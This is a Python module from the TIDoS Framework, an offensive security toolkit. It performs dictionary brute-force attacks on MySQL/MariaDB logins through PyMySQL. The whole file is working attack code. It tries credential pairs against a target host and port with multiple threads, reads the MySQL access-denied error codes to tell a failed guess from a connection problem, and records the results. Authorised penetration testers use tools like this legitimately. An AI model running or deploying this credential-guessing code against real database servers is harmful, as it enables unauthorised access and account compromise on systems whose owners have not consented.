#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

# This module requires TIDoS Framework
# https://github.com/0xInfection/TIDoS-Framework

"""Dictionary brute force of MySQL/MariaDB logins (via PyMySQL)."""

from __future__ import annotations

import importlib.util

from core.methods import brute, modkit as kit
from core.methods.print import pbrute

info = "Brute force MySQL/MariaDB database credentials using dictionaries."
searchinfo = "SQL Login Cracker"
properties = brute.options(port_default=3306, threads_default=4)


def _try_login(ip, port, user, password, timeout):
    try:
        import pymysql
        from pymysql.err import OperationalError
    except ImportError as e:         # optional dependency; surface once per run
        raise ConnectionError(f"PyMySQL not installed ({e}); pip install PyMySQL") from e

    try:
        conn = pymysql.connect(host=ip, port=int(port), user=user,
                               password=password, connect_timeout=timeout,
                               read_timeout=timeout)
        conn.close()
        return True
    except OperationalError as e:
        # 1045 = access denied (auth failure); other codes = transport trouble
        code = e.args[0] if e.args else 0
        if code in (1045, 1044, 1698):
            return False
        raise ConnectionError(str(e)) from e
    except Exception as e:
        raise ConnectionError(str(e)) from e


def attack(target):
    pbrute("SQL")
    if importlib.util.find_spec("pymysql") is None:
        kit.bad("PyMySQL is not installed; run `pip install PyMySQL` to use sqlbrute.")
        kit.Recorder(target, kit.BRUTE, "sqlbrute")(
            "No valid credentials found (PyMySQL not installed).")
        return
    return brute.run(target, properties, proto="sql", port_default=3306,
              try_login=_try_login, lvl2="sqlbrute", threads_default=4,
              service="MySQL")
